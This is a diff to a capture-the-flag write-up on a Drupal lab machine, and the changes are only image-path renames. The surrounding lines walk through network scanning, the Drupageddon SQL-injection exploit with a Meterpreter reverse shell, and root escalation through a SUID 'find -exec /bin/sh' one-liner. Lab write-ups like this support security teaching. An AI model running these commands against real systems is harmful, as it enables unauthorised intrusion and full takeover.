@@ -35,7 +35,7 @@ sudo netdiscover -r 192.168.35.0/24
 * `netdiscover`: A specialized address discovery tool for local Ethernet networks, capable of operating both in passive listening mode and in active mode, sending ARP queries in bulk.
 * `-r 192.168.35.0/24`: Specifies the IPv4 subnet range to be examined in CIDR (*Classless Inter-Domain Routing*) notation. The program sends ARP requests, sequentially or in parallel, to all 254 possible addresses in the range (`192.168.35.1` through `192.168.35.254`), collecting and sorting the replies in real time.
 
-![Discovering Live Hosts on the Local Subnet with Netdiscover](../../04.%20DC-CTF/images/image.png)
+![Discovering Live Hosts on the Local Subnet with Netdiscover](../../05.%20DC-CTF/images/image.png)
 
 *Figure 1 — Discovering Live Hosts on the Local Subnet with Netdiscover*
 
@@ -47,7 +47,7 @@ Once the target's IP address (`192.168.35.131`) has been confirmed, a detailed m
 nmap -sV -p- 192.168.35.131
 ```
 
-![Detailed Nmap Service Scan Output](../../04.%20DC-CTF/images/image-1.png)
+![Detailed Nmap Service Scan Output](../../05.%20DC-CTF/images/image-1.png)
 *Figure 2 — Detailed Nmap Service Scan Output*
 
 * `nmap`: Network Mapper, the internationally recognized tool for network auditing, topology mapping, and vulnerability analysis.
@@ -75,7 +75,7 @@ msfconsole
 
 * `msfconsole`: Launches Metasploit's interactive Command-Line Interface. On startup, the environment initializes its connections to the underlying PostgreSQL database, loads thousands of catalogued vulnerability modules into RAM, and provides a flexible shell for managing attacks.
 
-![Launching the msfconsole Interface](../../04.%20DC-CTF/images/image-2.png)
+![Launching the msfconsole Interface](../../05.%20DC-CTF/images/image-2.png)
 *Figure 3 — Launching the msfconsole Interface*
 
 ### 3.2 Searching for Specialized Modules for the Drupal CMS
@@ -88,7 +88,7 @@ msf6 > search drupal
 
 * `search drupal`: Recursively searches the `exploits/`, `auxiliary/`, and `post/` libraries for any module containing the term "drupal" in its title, description, or metadata. The result is a table showing the module name, the vulnerability disclosure date, the reliability rating (Ranking), and a short description of the attack mechanism.
 
-![Drupal Module Search Results Table](../../04.%20DC-CTF/images/image-3.png)
+![Drupal Module Search Results Table](../../05.%20DC-CTF/images/image-3.png)
 
 *Figure 4 — Drupal Module Search Results Table*
 
@@ -96,7 +96,7 @@ msf6 > search drupal
 
 From the results, the module `exploit/multi/http/drupal_drupageddon` is selected. This vulnerability (**CVE-2014-3704**) resides in the Database Abstraction API of Drupal 7.x, which did not adequately sanitize the array parameters passed into prepared SQL statements.
 
-![`use exploit/multi/http/drupal_drupageddon`: automatic selection of the `php/meterpreter/reverse_tcp` payload.](../../04.%20DC-CTF/images/image-4.png)
+![`use exploit/multi/http/drupal_drupageddon`: automatic selection of the `php/meterpreter/reverse_tcp` payload.](../../05.%20DC-CTF/images/image-4.png)
 
 *Figure 5 — `use exploit/multi/http/drupal_drupageddon`: automatic selection of the `php/meterpreter/reverse_tcp` payload.*
 
@@ -112,11 +112,11 @@ msf6 exploit(multi/http/drupal_drupageddon) > exploit
  * `set RHOSTS 192.168.35.131`: Sets the `RHOSTS` (*Remote Hosts*) option, specifying the IPv4 address of the vulnerable target server.
  * `exploit` (or alternatively `run`): Launches the attack. Metasploit sets up a local listener (handler) on the Kali machine, crafts the malicious HTTP POST requests containing the SQL Injection payload and the PHP reverse shell, and sends them to the target. As soon as the code is executed by the Apache server, the target connects back to Kali Linux, opening an active Meterpreter session.
 
-![Setting the target with `set RHOSTS 192.168.35.131`.](../../04.%20DC-CTF/images/image-5.png)
+![Setting the target with `set RHOSTS 192.168.35.131`.](../../05.%20DC-CTF/images/image-5.png)
 
 *Figure 6 — Setting the target with `set RHOSTS 192.168.35.131`.*
 
-![Successful Exploitation and Opening of a Meterpreter Session](../../04.%20DC-CTF/images/image-7.png)
+![Successful Exploitation and Opening of a Meterpreter Session](../../05.%20DC-CTF/images/image-7.png)
 
 *Figure 7 — Successful Exploitation and Opening of a Meterpreter Session*
 
@@ -137,7 +137,7 @@ meterpreter > shell
 * `shell`: Creates a new communication sub-channel within the Meterpreter session and starts a process of the basic command shell (`/bin/sh`) on the target.
 
 
-![Launching a Basic Shell via Meterpreter](../../04.%20DC-CTF/images/image-8.png)
+![Launching a Basic Shell via Meterpreter](../../05.%20DC-CTF/images/image-8.png)
 *Figure 8 — Launching a Basic Shell via Meterpreter*
 
 The initial shell obtained is a "dumb shell." It lacks TTY support, command auto-completion (tab completion), command history via the arrow keys, and proper handling of termination signals (for example, pressing `Ctrl+C` will terminate the entire session rather than the current process). To overcome this limitation, the shell is upgraded to a full Pseudo-Terminal (PTY) using the Python interpreter.
@@ -166,7 +166,7 @@ cat flag1.txt
 * `-a` (*all*): Shows all files, including hidden ones (those whose names begin with a dot `.`, such as `.htaccess` and `.bashrc`).
  * `cat flag1.txt`: Concatenates and prints the contents of the text file `flag1.txt` to standard output (stdout).
 
-![Reading the flag1.txt File](../../04.%20DC-CTF/images/image-10.png)
+![Reading the flag1.txt File](../../05.%20DC-CTF/images/image-10.png)
 *Figure 9 — Reading the flag1.txt File*
 
 The content of Flag 1 indicates that the CMS configuration files contain critical data. In Drupal 7, the core configuration file is `sites/default/settings.php`, which includes, among other things, the credentials for connecting to the MySQL database.
@@ -190,7 +190,7 @@ find / -perm -u=s -type f 2>/dev/null
 * `-type f`: Restricts the search exclusively to regular files, discarding directories, symbolic links, and special device files.
 * `2>/dev/null`: Redirects the standard error stream (Standard Error - file descriptor 2) to the kernel's special null device `/dev/null`. This suppresses the hundreds of "Permission denied" messages that would otherwise be produced as the unprivileged user `www-data` attempts to read protected system directories, keeping the output clean and readable.
 
-![SUID Binary Scan Results](../../04.%20DC-CTF/images/image-11.png)
+![SUID Binary Scan Results](../../05.%20DC-CTF/images/image-11.png)
 
 *Figure 10 — SUID Binary Scan Results*
 
@@ -205,7 +205,7 @@ Because the `find` binary is owned by `root` and carries the SUID bit, every chi
 /usr/bin/find . -exec /bin/sh \; -quit
 ```
 
-![Shell with `root` privileges obtained by abusing the SUID `find`.](../../04.%20DC-CTF/images/image-12.png)
+![Shell with `root` privileges obtained by abusing the SUID `find`.](../../05.%20DC-CTF/images/image-12.png)
 
 *Figure 11 — Shell with `root` privileges obtained by abusing the SUID `find`.*
 
@@ -216,7 +216,7 @@ Because the `find` binary is owned by `root` and carries the SUID bit, every chi
   * The `;` symbol marks the end of the `-exec` argument, while the backslash `\` (escape character) is required so that the `;` character is interpreted by `find` itself rather than prematurely by the parent bash shell.
  * `-quit`: Instructs `find` to terminate immediately after the first successful execution. Without the `-quit` option, `find` would attempt to execute `/bin/sh` repeatedly for every file in the directory, spawning multiple unnecessary sub-shells.
 
-![Successful Privilege Escalation to Root](../../04.%20DC-CTF/images/image-13.png)
+![Successful Privilege Escalation to Root](../../05.%20DC-CTF/images/image-13.png)
 
 *Figure 12 — Successful Privilege Escalation to Root*
 
@@ -236,7 +236,7 @@ cat thefinalflag.txt
 * `ls -la`: Lists in detail all contents of the `/root` directory, revealing the presence of the file `thefinalflag.txt`.
 * `cat thefinalflag.txt`: Reads and prints the lab's final completion message to the screen.
 
-![Reading the Final thefinalflag.txt File](../../04.%20DC-CTF/images/image-14.png)
+![Reading the Final thefinalflag.txt File](../../05.%20DC-CTF/images/image-14.png)
 *Figure 13 — Reading the Final thefinalflag.txt File*
 
 ## 6. Technical Summary, Risk Assessment & Remediation Measures
